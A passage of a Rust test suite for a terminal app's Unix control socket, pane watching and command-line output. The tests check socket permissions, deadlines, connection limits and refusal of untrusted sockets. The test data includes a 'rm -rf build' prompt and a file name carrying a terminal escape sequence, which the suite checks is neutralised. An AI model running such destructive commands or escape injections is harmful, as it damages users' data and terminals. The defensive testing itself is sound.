    assert!(long.ends_with(kept), "the end is what is kept");
    assert!(kept.starts_with("line "), "from a whole line: {kept:?}");

    // A cut that lands exactly on a line's start keeps that line.
    assert_eq!(blocks::tail("aaa\nbbb\nccc", 7), ("bbb\nccc", true));

    // One line longer than the cap on its own is cut where a character
    // starts rather than dropped.
    let wide = "é".repeat(100);
    let (kept, cut) = blocks::tail(&wide, 51);
    assert!(cut);
    assert_eq!(kept, "é".repeat(25));
}

#[test]
fn a_wait_says_where_the_pane_got_to_and_fails_when_it_did_not() {
    let waited =
        |until, reached, status: Option<&str>, message: Option<&str>, closed| protocol::Waited {
            pane_id: 7,
            until,
            reached,
            status: status.map(str::to_owned),
            message: message.map(str::to_owned),
            exit: None,
            closed,
        };
    let ten = Duration::from_secs(10);
    let printed = cli::waited_text(
        &waited(
            protocol::Until::NeedsInput,
            true,
            Some("needs-input"),
            Some("run rm -rf build?"),
            false,
        ),
        ten,
    );
    assert_eq!(printed.text, "needs-input: run rm -rf build?");
    assert_eq!(printed.failure, None);

    let finished = protocol::Waited {
        exit: Some(3),
        ..waited(protocol::Until::Finished, true, Some("idle"), None, false)
    };
    assert_eq!(cli::waited_text(&finished, ten).text, "finished: exit 3");

    let exited = waited(protocol::Until::Exited, true, None, None, true);
    assert_eq!(cli::waited_text(&exited, ten).text, "exited");
    assert_eq!(cli::waited_text(&exited, ten).failure, None);

    let ran_out = cli::waited_text(
        &waited(protocol::Until::Idle, false, Some("running"), None, false),
        ten,
    );
    assert_eq!(ran_out.text, "running");
    assert_eq!(
        ran_out.failure.as_deref(),
        Some("pane 7 was not idle within 10 seconds; it is running")
    );

    let closed = cli::waited_text(
        &waited(protocol::Until::Finished, false, None, None, true),
        ten,
    );
    assert_eq!(closed.text, "closed");
    assert_eq!(
        closed.failure.as_deref(),
        Some("pane 7 closed before it was finished")
    );
}

#[test]
fn a_pane_watches_itself_and_the_tabs_it_opened_and_theirs_and_nobody_else() {
    let (mut window, ids) = busy_window();
    let [lead, other, worker, stranger] = ids[..] else {
        panic!("four panes: {ids:?}");
    };
    let pane = |number: u64| {
        window.workspace.read(&window.app, |workspace, _| {
            workspace
                .tabs()
                .panes()
                .map(|(_, pane)| pane.id())
                .find(|pane| pane.as_u64() == number)
                .expect("open")
        })
    };
    let (lead, other, worker, stranger) = (pane(lead), pane(other), pane(worker), pane(stranger));
    let lineage = |caller, root| crate::tab::Lineage {
        caller,
        root,
        title: "the lead".to_owned(),
    };
    // The lead opened the worker, and the worker opened the other half of
    // the lead's split — a stand-in for a tab of its own.
    window.workspace.update(&mut window.app, |workspace, ctx| {
        workspace.update_session(worker, ctx, |session| {
            session.spawned_by = Some(lineage(lead, lead));
        });
        workspace.update_session(other, ctx, |session| {
            session.spawned_by = Some(lineage(worker, lead));
        });
    });
    let observes = |window: &Window, caller, pane| {
        window.workspace.read(&window.app, |workspace, _| {
            workspace.watches().observes(workspace.tabs(), caller, pane)
        })
    };
    assert!(observes(&window, lead, lead), "itself");
    assert!(observes(&window, lead, worker), "a tab it opened");
    assert!(observes(&window, lead, other), "a tab its tab opened");
    assert!(observes(&window, worker, other), "the worker's own");
    assert!(observes(&window, worker, worker));
    assert!(
        !observes(&window, worker, lead),
        "a worker does not watch its lead: the lead is a pane a person opened"
    );
    assert!(!observes(&window, lead, stranger), "a pane a person opened");
    assert!(!observes(&window, other, worker), "nor up the chain");

    // The middle of the chain closing leaves the lead the root of what is
    // left, and the worker's own gone with its claim.
    window.workspace.update(&mut window.app, |workspace, ctx| {
        workspace.apply(TabAction::ClosePane(worker), ctx);
    });
    assert!(observes(&window, lead, other));
}

#[test]
fn a_closed_tab_is_remembered_as_its_openers_and_only_the_newest_are() {
    let mut strip = crate::tab::TabStrip::new();
    let lead = strip.focused_pane_id().expect("a pane");
    let mut watches = watch::Watches::default();
    // A tab opened for `caller`, the way `tab.new` opens one: its lineage
    // written before the strip settles.
    let open = |strip: &mut crate::tab::TabStrip, watches: &mut watch::Watches, caller| {
        strip.apply(TabAction::New);
        let pane = strip.focused_pane_id().expect("the new tab's pane");
        strip.pane_mut(pane).expect("open").session_mut().spawned_by = Some(crate::tab::Lineage {
            caller,
            root: lead,
            title: "the lead".to_owned(),
        });
        watches.settled(strip);
        pane
    };
    let close = |strip: &mut crate::tab::TabStrip, watches: &mut watch::Watches, pane| {
        strip.apply(TabAction::ClosePane(pane));
        watches.settled(strip);
    };

    // A worker's worker, whose opener closes first and then it: the worker in
    // the middle still watches it, through the closed one it opened.
    let worker = open(&mut strip, &mut watches, lead);
    let middle = open(&mut strip, &mut watches, worker);
    let last = open(&mut strip, &mut watches, middle);
    close(&mut strip, &mut watches, middle);
    close(&mut strip, &mut watches, last);
    assert!(watches.observes(&strip, lead, last), "the root's still");
    assert!(
        watches.observes(&strip, worker, last),
        "and the worker's, up the chain through a pane that has gone"
    );
    assert!(!watches.observes(&strip, last, worker), "never down it");

    // Only the newest are remembered, whatever the window has seen.
    let mut closed = Vec::new();
    for _ in 0..watch::REMEMBERED_CLOSED {
        let pane = open(&mut strip, &mut watches, lead);
        close(&mut strip, &mut watches, pane);
        closed.push(pane);
    }
    assert!(
        !watches.observes(&strip, lead, last),
        "forgotten past {} closed tabs",
        watch::REMEMBERED_CLOSED
    );
    for pane in closed {
        assert!(watches.observes(&strip, lead, pane), "{pane:?}");
    }
}

/// The socket, which is only Unix's.
#[cfg(unix)]
mod socket {
    use std::fs;
    use std::io::{BufRead, BufReader, Write};
    use std::os::unix::fs::{FileTypeExt, PermissionsExt};
    use std::os::unix::net::{UnixListener, UnixStream};
    use std::sync::atomic::{AtomicU64, Ordering};
    use std::thread;

    use super::super::protocol::{MAX_LINE, Opened, Refusal};
    use super::super::server::{self, Answer, Lanes, Place, Socket, converse};
    use super::*;

    /// A directory that removes itself, short enough that a socket's path in
    /// it fits the hundred-odd bytes a socket address holds on macOS.
    struct TempDir(PathBuf);

    impl TempDir {
        fn new() -> Self {
            Self::under(&std::env::temp_dir())
        }

        /// The same in `$XDG_RUNTIME_DIR` when there is one, which is short
        /// and this user's alone, and is not `/tmp`, where a per-user quota
        /// something else has filled fails the `mkdir` before the test has
        /// asked anything.
        fn runtime() -> Self {
            let runtime = std::env::var_os("XDG_RUNTIME_DIR")
                .map(PathBuf::from)
                .filter(|runtime| runtime.is_absolute() && runtime.is_dir());
            Self::under(&runtime.unwrap_or_else(std::env::temp_dir))
        }

        fn under(base: &Path) -> Self {
            static NEXT: AtomicU64 = AtomicU64::new(0);
            let path = base.join(format!(
                "crook-cc-{}-{}",
                std::process::id(),
                NEXT.fetch_add(1, Ordering::Relaxed)
            ));
            let _ = fs::remove_dir_all(&path);
            fs::create_dir_all(&path).expect("a temporary directory");
            Self(path)
        }

        /// Where a control directory would go, not yet made.
        fn sockets(&self) -> PathBuf {
            self.0.join("s")
        }
    }

    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    /// A window that answers `pane.list` with these, refuses every tab, and
    /// never looks at a tab strip.
    fn answering(panes: Vec<PaneEntry>) -> Answer {
        Arc::new(move |request: Request, _, _| match request.verb {
            Verb::PaneList => Ok(serde_json::to_value(&panes).expect("encodes")),
            _ => Err(Refusal::new(code::UNAUTHORIZED, "not in this test")),
        })
    }

    /// The name this process asks for first.
    fn first_name(directory: &Path) -> PathBuf {
        directory.join(format!("{}.sock", std::process::id()))
    }

    /// Leaves a socket at `path` that nobody is listening on — what a Crook
    /// that was killed leaves — and returns once a connection to it is
    /// refused.
    ///
    /// Bound and dropped is not enough on its own while the suite runs. The
    /// shell tests beside these start ptys by `fork` and `exec`, and a fork
    /// that lands between the bind and the drop hands the child a copy of
    /// the listener: until that child execs, the "dead" socket accepts, and a
    /// sweep or a claim that knocks on it is right to leave it alone. The
    /// test that then found it still there was failing on the suite's timing,
    /// one run in a few, and never alone.
    fn dead_socket(path: &Path) {
        drop(UnixListener::bind(path).expect("bound"));
        let deadline = Instant::now() + Duration::from_secs(10);
        while !UnixStream::connect(path)
            .is_err_and(|error| error.kind() == std::io::ErrorKind::ConnectionRefused)
        {
            assert!(
                Instant::now() < deadline,
                "{} never went dead",
                path.display()
            );
            thread::sleep(Duration::from_millis(5));
        }
    }

    fn mode(path: &Path) -> u32 {
        fs::symlink_metadata(path)
            .expect("there")
            .permissions()
            .mode()
            & 0o777
    }

    /// One end of a conversation, read a reply at a time.
    struct Client {
        stream: UnixStream,
        replies: BufReader<UnixStream>,
    }

    impl Client {
        fn on(stream: UnixStream) -> Self {
            stream
                .set_read_timeout(Some(Duration::from_secs(10)))
                .expect("a timeout");
            let replies = BufReader::new(stream.try_clone().expect("a second handle"));
            Self { stream, replies }
        }

        fn connect(path: &Path) -> Self {
            Self::on(UnixStream::connect(path).expect("the socket answers"))
        }

        fn send(&mut self, line: &str) {
            self.stream.write_all(line.as_bytes()).expect("sent");
        }

        /// The next reply, or `None` once the window has closed its end.
        fn reply(&mut self) -> Option<Reply> {
            let mut line = String::new();
            match self.replies.read_line(&mut line) {
                Ok(0) | Err(_) => None,
                Ok(_) => Some(serde_json::from_str(&line).expect("a reply")),
            }
        }
    }

    /// A conversation with no listener in front of it, and the thread
    /// answering it.
    fn conversation(answer: Answer, deadline: Duration) -> (Client, thread::JoinHandle<()>) {
        conversation_in(&Arc::new(Lanes::default()), answer, deadline)
    }

    /// The same, holding a place in `lanes`, as the listener gives each
    /// connection one.
    fn conversation_in(
        lanes: &Arc<Lanes>,
        answer: Answer,
        deadline: Duration,
    ) -> (Client, thread::JoinHandle<()>) {
        let (client, window) = UnixStream::pair().expect("a pair");
        let mut place = Place::take(lanes).expect("a place among the connections answered");
        let answering = thread::spawn(move || {
            converse(&window, Instant::now() + deadline, &*answer, &mut place);
        });
        (Client::on(client), answering)
    }

    #[test]
    fn a_line_longer_than_the_cap_is_refused_and_the_connection_closed() {
        let (mut client, answering) = conversation(answering(two_panes()), Duration::from_secs(5));
        // Written from a thread of its own, and more than the cap: the window
        // stops reading at the cap, and a write it no longer reads would
        // otherwise block the test on a small socket buffer.
        let mut writer = client.stream.try_clone().expect("a second handle");
        let writing = thread::spawn(move || {
            let _ = writer.write_all(&vec![b'x'; MAX_LINE * 2]);
        });

        let refusal = client.reply().expect("refused, not dropped");
        assert!(!refusal.ok);
        assert_eq!(refusal.v, protocol::VERSION);
        assert_eq!(refusal.error.expect("a refusal").code, code::TOO_LONG);
        assert!(client.reply().is_none(), "and the connection is closed");
        answering.join().expect("the connection's thread");
        writing.join().expect("the writer");
    }

    #[test]
    fn a_line_exactly_as_long_as_the_cap_is_answered() {
        let (mut client, answering) = conversation(answering(two_panes()), Duration::from_secs(5));
        let request = r#"{"v":1,"verb":"pane.list"}"#;
        let line = format!("{request}{}\n", " ".repeat(MAX_LINE - request.len()));
        assert_eq!(line.len(), MAX_LINE + 1);
        client.send(&line);
        let reply = client.reply().expect("answered");
        assert!(reply.ok, "{reply:?}");
        // Read whole, newline and all: the connection is still there for the
        // next line, as it would not be after one that was cut short.
        client.send(&protocol::request_line(&Verb::PaneList, None));
        assert!(client.reply().expect("the next line answered too").ok);
        drop(client);
        answering.join().expect("the connection's thread");
    }

    #[test]
    fn an_unknown_verb_is_refused_and_the_next_line_still_answered() {
        let (mut client, answering) = conversation(answering(two_panes()), Duration::from_secs(5));
        client.send(
            "{\"v\":1,\"id\":\"a\",\"verb\":\"pane.frobnicate\"}\n\n{\"v\":1,\"id\":\"b\",\"verb\":\"pane.list\"}\n",
        );

        let refused = client.reply().expect("a refusal, not a closed connection");
        assert_eq!(refused.id, Some(json!("a")));
        assert_eq!(refused.error.expect("refused").code, code::UNKNOWN_VERB);
        let answered = client.reply().expect("the next line is still read");
        assert_eq!(answered.id, Some(json!("b")));
        assert_eq!(
            answered.result,
            Some(serde_json::to_value(two_panes()).expect("encodes"))
        );

        drop(client);
        answering.join().expect("the connection's thread");
    }

    #[test]
    fn a_connection_that_says_nothing_is_closed_at_its_deadline() {
        let (mut client, answering) =
            conversation(answering(two_panes()), Duration::from_millis(100));
        let started = Instant::now();
        assert!(
            client.reply().is_none(),
            "nothing is answered, and the line closes"
        );
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "closed at the deadline, not by the client's own timeout"
        );
        answering.join().expect("the connection's thread");
    }

    #[test]
    fn a_connection_that_sends_a_byte_before_each_read_runs_out_is_still_closed_at_its_deadline() {
        let deadline = Duration::from_millis(400);
        let (client, answering) = conversation(answering(two_panes()), deadline);
        // A byte well inside the time any one read waits, and never a
        // newline: a read timeout set once would be met every time, and the
        // connection held for as long as the bytes kept coming.
        let mut writer = client.stream.try_clone().expect("a second handle");
        let drips = 50;
        let started = Instant::now();
        let dripping = thread::spawn(move || {
            for _ in 0..drips {
                if writer.write_all(b"x").is_err() {
                    return;
                }
                thread::sleep(deadline / 4);
            }
        });

        answering.join().expect("the connection's thread");
        let took = started.elapsed();
        assert!(
            took < deadline * drips / 8,
            "closed at its deadline, not when the client ran out of bytes: {took:?}"
        );
        dripping.join().expect("the writer");
        drop(client);
    }

    #[test]
    fn a_question_the_window_does_not_get_to_is_refused_as_a_timeout_before_the_line_closes() {
        // A real inbox that nothing serves: a window whose main thread is
        // held the whole time, by a long frame or a blocked save.
        let inbox = Arc::new(Inbox::default());
        let asking = inbox.clone();
        let (mut client, answering) = conversation(
            Arc::new(move |request, feed, deadline| asking.ask(request, feed, deadline)),
            Duration::from_millis(600),
        );
        client.send(&protocol::request_line(&Verb::PaneList, None));
        let reply = client
            .reply()
            .expect("the window says it ran out of time, rather than hanging up");
        assert!(!reply.ok);
        assert_eq!(reply.error.expect("a refusal").code, code::TIMEOUT);
        answering.join().expect("the connection's thread");
    }

    #[test]
    fn the_command_line_hears_timeout_from_a_window_that_never_answers() {
        let root = TempDir::new();
        // Opened and never served: every question goes unanswered until its
        // time is up, and the command line has to wait long enough to be told.
        let control = Control::open_in(&root.sockets()).expect("opens");
        let path = control.path().expect("a socket").to_owned();
        let refusal = cli::unix::listing(&path, None, true, None).expect_err("never answered");
        let said = refusal.to_string();
        assert!(
            said.contains("did not answer in time") && said.contains("timeout"),
            "{said}"
        );
    }

    #[test]
    fn the_socket_is_this_users_alone() {
        let root = TempDir::new();
        let directory = root.sockets();
        let socket = Socket::open_in(&directory, answering(two_panes())).expect("opens");

        assert_eq!(mode(&directory), 0o700, "nobody else can reach inside");
        assert_eq!(socket.path(), first_name(&directory));
        assert!(
            fs::symlink_metadata(socket.path())
                .expect("there")
                .file_type()
                .is_socket()
        );
        assert_eq!(
            mode(socket.path()),
            0o600,
            "and the socket is locked as well"
        );

        let mut client = Client::connect(socket.path());
        client.send(&protocol::request_line(&Verb::PaneList, None));
        assert!(client.reply().expect("answered").ok);
    }

    #[test]
    fn a_directory_anyone_else_could_have_written_is_refused() {
        let root = TempDir::new();

        let open = root.sockets();
        fs::create_dir(&open).expect("made");
        fs::set_permissions(&open, fs::Permissions::from_mode(0o755)).expect("loosened");
        assert!(Socket::open_in(&open, answering(Vec::new())).is_err());
        assert_eq!(
            fs::read_dir(&open).expect("there").count(),
            0,
            "nothing is left in a directory that was refused"
        );

        let private = root.0.join("private");
        fs::create_dir(&private).expect("made");
        fs::set_permissions(&private, fs::Permissions::from_mode(0o700)).expect("closed");
        let link = root.0.join("link");
        std::os::unix::fs::symlink(&private, &link).expect("linked");
        assert!(
            Socket::open_in(&link, answering(Vec::new())).is_err(),
            "a link is refused as a link, whatever it points at"
        );
        assert_eq!(fs::read_dir(&private).expect("there").count(), 0);

        let file = root.0.join("file");
        fs::write(&file, "").expect("written");
        assert!(Socket::open_in(&file, answering(Vec::new())).is_err());

        // Somebody else's: a test cannot give a directory away without being
        // root, so it asks as the next uid instead.
        assert!(server::check(&private, server::euid()).is_ok());
        let theirs = server::check(&private, server::euid() + 1).expect_err("not ours");
        assert!(theirs.to_string().contains("belongs to"), "{theirs}");
    }

    #[test]
    fn a_socket_left_by_a_crook_that_died_is_taken_back() {
        let root = TempDir::new();
        let directory = root.sockets();
        fs::create_dir(&directory).expect("made");
        fs::set_permissions(&directory, fs::Permissions::from_mode(0o700)).expect("closed");
        // Bound and dropped: the file stays and nothing listens, which is
        // what a Crook that was killed leaves.
        dead_socket(&first_name(&directory));
        assert!(first_name(&directory).exists());

        let socket = Socket::open_in(&directory, answering(two_panes())).expect("opens");
        assert_eq!(
            socket.path(),
            first_name(&directory),
            "the name is taken back"
        );
        let mut client = Client::connect(socket.path());
        client.send(&protocol::request_line(&Verb::PaneList, None));
        assert!(client.reply().expect("and it is this window answering").ok);
    }

    #[test]
    fn a_socket_somebody_is_listening_on_is_not_taken() {
        let root = TempDir::new();
        let directory = root.sockets();
        fs::create_dir(&directory).expect("made");
        fs::set_permissions(&directory, fs::Permissions::from_mode(0o700)).expect("closed");
        let theirs = UnixListener::bind(first_name(&directory)).expect("bound");

        let socket = Socket::open_in(&directory, answering(two_panes())).expect("opens");
        assert_eq!(
            socket.path(),
            directory.join(format!("{}-1.sock", std::process::id())),
            "the next name, and not the live one"
        );
        let _knocking = UnixStream::connect(first_name(&directory)).expect("still theirs");
        theirs
            .accept()
            .expect("the connection reached them, not this window");
    }

    #[test]
    fn the_socket_goes_when_the_window_does_and_only_its_own() {
        let root = TempDir::new();
        let directory = root.sockets();

        let socket = Socket::open_in(&directory, answering(Vec::new())).expect("opens");
        let path = socket.path().to_owned();
        drop(socket);
        assert!(!path.exists(), "the file goes with the window");

        // A socket somebody else has since put at the same name is theirs.
        let socket = Socket::open_in(&directory, answering(Vec::new())).expect("opens");
        let path = socket.path().to_owned();
        fs::remove_file(&path).expect("removed from under it");
        let _theirs = UnixListener::bind(&path).expect("bound at the same name");
        drop(socket);
        assert!(path.exists(), "a drop removes only the file it bound");
    }

    #[test]
    fn the_sweep_takes_dead_sockets_and_leaves_everything_else() {
        let root = TempDir::new();
        let directory = root.0.clone();
        let dead = directory.join("100.sock");
        dead_socket(&dead);
        let live = directory.join("200.sock");
        let _listening = UnixListener::bind(&live).expect("bound");
        let file = directory.join("300.sock");
        fs::write(&file, "").expect("written");

        server::sweep(&directory, server::STALE_AFTER);
        assert!(
            dead.exists(),
            "a socket bound a moment ago may be about to listen"
        );

        server::sweep(&directory, Duration::ZERO);
        assert!(!dead.exists(), "nobody was listening");
        assert!(live.exists(), "somebody is");
        assert!(file.exists(), "not a socket, and not the sweep's");
    }

    #[test]
    fn the_runtime_directory_is_used_only_when_it_is_this_users() {
        let root = TempDir::new();
        let temp = Path::new("/tmp-of-this-test");
        let uid = server::euid();
        let fallback = temp.join(format!("crook-control-{uid}"));

        assert_eq!(
            server::directory_for(Some(root.0.clone().into()), temp, uid),
            root.0.join("crook-control")
        );
        for (runtime, why) in [
            (None, "unset"),
            (Some("run/user/1000".into()), "relative"),
            (Some(root.0.join("missing").into()), "not there"),
        ] {
            assert_eq!(server::directory_for(runtime, temp, uid), fallback, "{why}");
        }
        assert_eq!(
            server::directory_for(Some(root.0.clone().into()), temp, uid + 1),
            temp.join(format!("crook-control-{}", uid + 1)),
            "somebody else's runtime directory is not this user's"
        );
    }

    #[test]
    fn a_ninth_connection_is_turned_away_as_busy() {
        let root = TempDir::new();
        let socket = Socket::open_in(&root.sockets(), answering(Vec::new())).expect("opens");
        // Each of these holds its connection's thread until it closes or its
        // five seconds are up, and says nothing.
        let holding: Vec<UnixStream> = (0..server::MAX_CONNECTIONS)
            .map(|_| UnixStream::connect(socket.path()).expect("admitted"))
            .collect();

        let mut turned_away = Client::connect(socket.path());
        let refusal = turned_away.reply().expect("refused, not dropped");
        assert_eq!(refusal.error.expect("a refusal").code, code::BUSY);

        drop(holding);
    }

    #[test]
    fn the_command_line_prints_what_the_window_answered() {
        let root = TempDir::new();
        let socket = Socket::open_in(&root.sockets(), answering(two_panes())).expect("opens");

        let json = cli::unix::listing(socket.path(), None, true, None).expect("answered");
        let read: Value = serde_json::from_str(&json).expect("the output is JSON");
        assert_eq!(read, serde_json::to_value(two_panes()).expect("encodes"));

        let table =
            cli::unix::listing(socket.path(), None, false, Some(Path::new("/home/someone")))
                .expect("answered");
        assert_eq!(
            table,
            cli::table(&two_panes(), Some(Path::new("/home/someone")))
        );
    }

    #[test]
    fn the_command_line_says_what_a_refusal_said() {
        let root = TempDir::new();
        let socket = Socket::open_in(
            &root.sockets(),
            Arc::new(|_, _, _| {
                Err(Refusal::new(
                    code::TIMEOUT,
                    "the window did not answer in time",
                ))
            }),
        )
        .expect("opens");

        let refusal = cli::unix::listing(socket.path(), None, true, None).expect_err("refused");
        let said = refusal.to_string();
        assert!(
            said.contains("did not answer in time") && said.contains("timeout"),
            "{said}"
        );

        // Beside the window's own, in a directory that passes the check, so
        // that what is refused is the socket not being there.
        let missing = socket.path().with_file_name("nobody.sock");
        let refusal = cli::unix::listing(&missing, None, true, None).expect_err("nothing there");
        assert!(
            refusal.to_string().contains("nothing is answering"),
            "{refusal}"
        );
    }

    #[test]
    fn the_command_line_prints_a_new_tabs_number_alone_and_the_note_beside_it() {
        // `id=$(crook tab new …)` is how a lead keeps the number, so a note
        // the window adds goes beside it, to standard error, and never into
        // what that reads. It names the repository's files, and a file's name
        // can hold an escape sequence, so it is printed as text a terminal
        // shows rather than acts on.
        let root = TempDir::new();
        let opened = Opened {
            pane_id: 7,
            tab_id: 3,
            cwd: Some("/store/repo/fix-x".to_owned()),
            note: Some(
                "Copied 1 file from .worktreeinclude, but not \u{1b}]0;x\u{7}.env (not ignored \
                 in the new checkout)."
                    .to_owned(),
            ),
        };
        let answer = serde_json::to_value(&opened).expect("encodes");
        let socket = Socket::open_in(&root.sockets(), Arc::new(move |_, _, _| Ok(answer.clone())))
            .expect("opens");

        let printed = cli::unix::open_tab(socket.path(), Some("token"), new_tab(&["make"]), false)
            .expect("answered");
        assert_eq!(printed.text, "7");
        assert_eq!(printed.failure, None);
        let note = printed.note.expect("the note is printed");
        assert!(note.contains(r"but not \u{1b}]0;x\u{7}.env"), "{note}");
        assert!(!note.chars().any(char::is_control), "{note:?}");

        // With `--json` the answer carries its own note, escaped as JSON.
        let printed = cli::unix::open_tab(socket.path(), Some("token"), new_tab(&["make"]), true)
            .expect("answered");
        assert_eq!(printed.note, None, "the note was printed twice");
        let read: Opened = serde_json::from_str(&printed.text).expect("the output is JSON");
        assert_eq!(read, opened);

        // And a window with nothing to say sends the three fields it always
        // has, which is what a script written before the note reads.
        let quiet = serde_json::to_value(Opened {
            note: None,
            ..opened
        })
        .expect("encodes");
        assert_eq!(
            quiet.as_object().map(serde_json::Map::len),
            Some(3),
            "{quiet}"
        );
    }

    #[test]
    fn outside_a_pane_the_command_line_asks_the_only_window_and_will_not_guess_among_several() {
        let root = TempDir::new();
        let directory = root.sockets();
        let socket_from = |socket: Option<&str>, pane: Option<&str>| {
            cli::unix::socket_from(socket.map(Into::into), pane.map(Into::into), &directory)
                .map_err(|error| error.to_string())
        };

        let text = |path: &Path| path.to_str().expect("a path in UTF-8").to_owned();

        // A pane's own window is asked only once its socket has been checked,
        // and one that has gone, with the directory it was in, is closed.
        let closed = socket_from(Some(&text(&directory.join("42.sock"))), Some("3"))
            .expect_err("nothing there");
        assert!(closed.contains("nothing is answering"), "{closed}");
        let empty = socket_from(Some(""), Some("3")).expect_err("that window has no socket");
        assert!(empty.contains("has no control socket"), "{empty}");
        let older = socket_from(None, Some("3")).expect_err("a Crook from before the socket");
        assert!(older.contains("older"), "{older}");

        let none = socket_from(None, None).expect_err("nothing running");
        assert!(none.contains("no Crook is running"), "{none}");

        let first = Socket::open_in(&directory, answering(Vec::new())).expect("opens");
        // A dead one beside it.
        dead_socket(&directory.join("1.sock"));
        assert_eq!(
            socket_from(None, None),
            Ok(first.path().to_owned()),
            "the one live window, and not the dead socket beside it"
        );

        let second = Socket::open_in(&directory, answering(Vec::new())).expect("opens");
        let several = socket_from(None, None).expect_err("two windows");
        assert!(
            several.contains(&first.path().display().to_string())
                && several.contains(&second.path().display().to_string()),
            "the refusal names them: {several}"
        );
        assert_eq!(
            socket_from(Some(&text(second.path())), Some("3")),
            Ok(second.path().to_owned()),
            "inside a pane, the pane's own window, whatever else is running"
        );

        drop((first, second));
        fs::set_permissions(&directory, fs::Permissions::from_mode(0o755)).expect("loosened");
        let stranger = directory.join("9.sock");
        let _stranger = UnixListener::bind(&stranger).expect("bound");
        assert!(
            socket_from(None, None).is_err(),
            "a socket in a directory anyone could write to is nobody's to trust"
        );
        let planted = socket_from(Some(&text(&stranger)), Some("3"))
            .expect_err("nor is it when the environment names it");
        assert!(planted.contains("open to other users"), "{planted}");
    }

    /// A listener at `a` in `directory`, made with `mode`, that answers
    /// nothing and accepts only when a test looks: what someone could leave
    /// at a name `CROOK_SOCKET` holds, and a record of whether anything
    /// connected to it. The socket is `0600`, as a window leaves its own, so
    /// that only what a test changes is wrong with it.
    fn planted(directory: &Path, mode: u32) -> (UnixListener, PathBuf) {
        fs::create_dir(directory).expect("made");
        fs::set_permissions(directory, fs::Permissions::from_mode(mode)).expect("its mode");
        let socket = directory.join("a");
        let listener = UnixListener::bind(&socket).expect("bound");
        fs::set_permissions(&socket, fs::Permissions::from_mode(0o600)).expect("locked");
        listener.set_nonblocking(true).expect("non-blocking");
        (listener, socket)
    }

    /// Whether anything has connected to `listener` since it was planted.
    ///
    /// A connection the kernel completed waits in the backlog until it is
    /// accepted, even once its client has closed it, so a client that
    /// connected and gave up is still seen.
    fn connected(listener: &UnixListener) -> bool {
        match listener.accept() {
            Ok(_) => true,
            Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => false,
            Err(error) => panic!("the listener broke: {error}"),
        }
    }

    #[test]
    fn a_socket_in_a_directory_others_can_enter_is_not_asked() {
        let root = TempDir::runtime();
        let (listener, socket) = planted(&root.sockets(), 0o755);

        let refusal = cli::unix::listing(&socket, None, true, None).expect_err("not asked");
        let said = format!("{refusal:#}");
        assert!(
            said.contains(&format!(
                "{} is open to other users",
                root.sockets().display()
            )),
            "the refusal names the rule: {said}"
        );
        assert!(!connected(&listener), "nothing was even connected to");

        // The directory is the one thing wrong with it.
        fs::set_permissions(root.sockets(), fs::Permissions::from_mode(0o700)).expect("closed");
        let _asked =
            cli::unix::connect_checked(&socket).expect("asked once only this user can enter");
        assert!(connected(&listener));
    }

    #[test]
    fn a_socket_that_is_a_link_is_not_asked() {
        let root = TempDir::runtime();
        let (listener, socket) = planted(&root.sockets(), 0o700);
        let link = root.sockets().join("l");
        std::os::unix::fs::symlink(&socket, &link).expect("linked");

        let refusal = cli::unix::listing(&link, None, true, None).expect_err("not asked");
        let said = format!("{refusal:#}");
        assert!(
            said.contains("is a link"),
            "the refusal names the rule: {said}"
        );
        assert!(!connected(&listener), "nothing was even connected to");

        let _asked = cli::unix::connect_checked(&socket).expect("the socket it points at is asked");
        assert!(connected(&listener));
    }

    #[test]
    fn a_relative_socket_path_is_not_asked() {
        let root = TempDir::runtime();
        let (listener, socket) = planted(&root.sockets(), 0o700);
        // Up from the working directory to the root and down to the socket:
        // a path that does reach it, so that it is the path's being relative
        // that is refused and not a name that leads nowhere.
        let here = std::env::current_dir().expect("a working directory");
        let relative = here
            .components()
            .skip(1)
            .map(|_| std::path::Component::ParentDir)
            .collect::<PathBuf>()
            .join(socket.strip_prefix("/").expect("an absolute path"));
        assert!(relative.is_relative());
        assert!(
            fs::symlink_metadata(&relative).is_ok_and(|metadata| metadata.file_type().is_socket()),
            "{} reaches the socket",
            relative.display()
        );

        let refusal = cli::unix::listing(&relative, None, true, None).expect_err("not asked");
        let said = format!("{refusal:#}");
        assert!(
            said.contains("absolute"),
            "the refusal names the rule: {said}"
        );
        assert!(!connected(&listener), "nothing was even connected to");
    }

    #[test]
    fn a_socket_others_can_reach_is_not_asked() {
        let root = TempDir::runtime();
        let (listener, socket) = planted(&root.sockets(), 0o700);
        fs::set_permissions(&socket, fs::Permissions::from_mode(0o666)).expect("loosened");

        let refusal = cli::unix::listing(&socket, None, true, None).expect_err("not asked");
        let said = format!("{refusal:#}");
        assert!(
            said.contains("open to other users (mode 666)"),
            "the refusal names the rule: {said}"
        );
        assert!(!connected(&listener), "nothing was even connected to");

        fs::set_permissions(&socket, fs::Permissions::from_mode(0o600)).expect("locked");
        let _asked =
            cli::unix::connect_checked(&socket).expect("asked once it is this user's alone");
        assert!(connected(&listener));
    }

    /// Asked as the next uid up, as `server::check`'s own test asks, since
    /// no test can leave a socket that belongs to somebody else.
    #[test]
    fn a_socket_another_user_owns_is_not_asked() {
        let root = TempDir::runtime();
        let (_listener, socket) = planted(&root.sockets(), 0o700);
        let metadata = fs::symlink_metadata(&socket).expect("there");
        let (mine, theirs) = (server::euid(), server::euid() + 1);

        assert_eq!(cli::unix::fault(&metadata, mine), None, "nothing wrong");
        assert_eq!(
            cli::unix::fault(&metadata, theirs),
            Some(format!("it belongs to uid {mine}, not {theirs}")),
            "the socket is the one thing whose owner is wrong"
        );
    }

    /// A socket swapped in between the look at it and the connect passes
    /// every rule about the path, so the listener is the last word: asked
    /// for a listener of the next uid up, the same socket is refused once it
    /// is connected to, and before anything is said to it.
    #[test]
    fn a_socket_another_user_listens_on_is_not_asked() {
        use std::io::Read;

        let root = TempDir::runtime();
        let (listener, socket) = planted(&root.sockets(), 0o700);
        let (mine, theirs) = (server::euid(), server::euid() + 1);

        let refusal =
            cli::unix::connect_checked_for(&socket, theirs).expect_err("not this user's listener");
        let said = format!("{refusal:#}");
        assert!(
            said.contains(&format!(
                "the process listening there is uid {mine}, not {theirs}"
            )),
            "the refusal names the rule: {said}"
        );
        let (mut asked, _) = listener
            .accept()
            .expect("connected to, since only a connection names its listener");
        asked.set_nonblocking(false).expect("blocking");
        let mut heard = Vec::new();
        asked.read_to_end(&mut heard).expect("the client hung up");
